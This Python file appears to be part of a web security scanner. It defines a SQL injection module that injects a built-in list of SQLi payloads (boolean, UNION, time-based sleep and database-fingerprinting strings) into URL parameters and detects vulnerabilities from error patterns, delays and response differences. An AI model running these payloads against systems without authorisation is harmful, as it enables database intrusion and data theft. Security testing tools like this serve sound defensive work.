"""
SQL Injection Scanner
Detects SQL injection vulnerabilities using multiple techniques
"""

import logging
import re
import time
from datetime import datetime
from urllib.parse import parse_qs, urlparse

from ..config import Config
from .base import BaseScanner

logger = logging.getLogger(__name__)


class SQLiScanner(BaseScanner):
    """SQL Injection vulnerability scanner"""
    def __init__(
        self, target, payload_file=None, output_file=None, dynamic_payloads=None
    ):
        super().__init__(target, output_file)
        self.payload_file = payload_file
        self.dynamic_payloads = dynamic_payloads
        self.sql_error_patterns = [
            r"sql syntax.*mysql",
            r"warning.*mysql_.*",
            r"postgresql.*error",
            r"oracle.*error",
            r"microsoft.*database.*error",
            r"warning.*sqlstate",
            r"odbc.*driver.*error",
            r"jdbc.*sqlexception",
            r"sqlite\.exception",
            r"mariadb.*error",
        ]

    def get_payloads(self):
        """Load SQL injection payloads"""
        default_payloads = [
            "' OR '1'='1",
            "' OR 1=1#",
            "' OR 1=1--",
            "' OR 1=1/*",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION ALL SELECT NULL,NULL,NULL--",
            "' OR SLEEP(5)--",
            "'; WAITFOR DELAY '0:0:5'--",
            "' OR pg_sleep(5)--",
            "' AND 1=1--",
            "' AND 1=2--",
            "' OR 'x'='x",
            "'; SELECT @@version--",
            "'; SELECT system_user()--",
            "'; SELECT current_database()--",
        ]

        if self.dynamic_payloads:
            return self.dynamic_payloads

        if self.payload_file:
            try:
                with open(self.payload_file, "r") as f:
                    custom_payloads = [
                        line.strip()
                        for line in f
                        if line.strip() and not line.startswith("#")
                    ]
                    default_payloads.extend(custom_payloads)
                    logger.info(f"Loaded {len(custom_payloads)} custom payloads")
                    print(
                        f"{Config.COLOR_GREEN}[+] Loaded {len(custom_payloads)} custom payloads{Config.COLOR_RESET}"
                    )
            except Exception as e:
                logger.error(f"Error loading payload file: {e}")
                print(
                    f"{Config.COLOR_ORANGE}[-] Error loading payload file: {str(e)}{Config.COLOR_RESET}"
                )

        return default_payloads

    def extract_parameters(self, url):
        """Extract parameters from URL"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        return {k: v[0] for k, v in params.items()}

    def analyze_response(self, response, original_response=None):
        """Analyze response for SQL injection indicators"""
        indicators = {
            "error_based": any(
                re.search(pattern, response.text.lower())
                for pattern in self.sql_error_patterns
            ),
            "time_based": response.elapsed.total_seconds() > 5,
            "size_based": original_response
            and abs(len(response.content) - len(original_response.content)) > 100,
            "status_code": response.status_code != 200,
        }
        return any(indicators.values()), indicators

    def scan(self):
        """Execute SQL injection scan"""
        print(
            f"\n{Config.COLOR_BLUE}[*] Starting Greaper SQLi scan on {self.target}{Config.COLOR_RESET}"
        )

        payloads = self.get_payloads()

        # Get baseline response
        try:
            baseline_response = self.make_request(self.target)
            print(
                f"{Config.COLOR_BLUE}[*] Established baseline response{Config.COLOR_RESET}"
            )
        except:
            print(
                f"{Config.COLOR_RED}[-] Could not establish baseline response{Config.COLOR_RESET}"
            )
            return

        # Extract parameters
        params = self.extract_parameters(self.target)
        if not params and "FUZZ" not in self.target:
            print(
                f"{Config.COLOR_RED}[-] No parameters found to test. Please include 'FUZZ' in URL or add parameters.{Config.COLOR_RESET}"
            )
            return

        found_vulnerabilities = []

        for payload in payloads:
            if params:
                for param_name, param_value in params.items():
                    test_url = self.target.replace(
                        f"{param_name}={param_value}", f"{param_name}={payload}"
                    )
                    try:
                        response = self.make_request(test_url)
                        is_vulnerable, indicators = self.analyze_response(
                            response, baseline_response
                        )

                        if is_vulnerable:
                            result = f"[+] Potential SQLi found on {test_url} With payload: {payload}"
                            print(f"{Config.COLOR_GREEN}{result}{Config.COLOR_RESET}")
                            found_vulnerabilities.append(result)
                        else:
                            print(
                                f"{Config.COLOR_RED}[-] No SQLi found for payload: {payload}{Config.COLOR_RESET}"
                            )
                    except Exception as e:
                        logger.error(f"Error testing payload: {e}")
                        print(
                            f"{Config.COLOR_RED}[-] Error testing payload: {str(e)}{Config.COLOR_RESET}"
                        )
            else:
                test_url = self.target.replace("FUZZ", payload)
                try:
                    response = self.make_request(test_url)
                    is_vulnerable, indicators = self.analyze_response(
                        response, baseline_response
                    )

                    if is_vulnerable:
                        result = f"[+] Potential SQLi found on {test_url} With payload: {payload}"
                        print(f"{Config.COLOR_GREEN}{result}{Config.COLOR_RESET}")
                        found_vulnerabilities.append(result)
                    else:
                        print(
                            f"{Config.COLOR_RED}[-] No SQLi found for payload: {payload}{Config.COLOR_RESET}"
                        )

                    time.sleep(0.5)
                except Exception as e:
                    logger.error(f"Error testing payload: {e}")
                    print(
                        f"{Config.COLOR_RED}[-] Error testing payload: {str(e)}{Config.COLOR_RESET}"
                    )

        self.results = found_vulnerabilities

        print("\n" + "=" * 50)
        if found_vulnerabilities:
            self.save_results()
        else:
            print(
                f"\n{Config.COLOR_RED}[-] No SQLi vulnerabilities found.{Config.COLOR_RESET}"
            )
            print(f"\n{Config.COLOR_RED}[-] No SQLi vulnerabilities found.{Config.COLOR_RESET}")
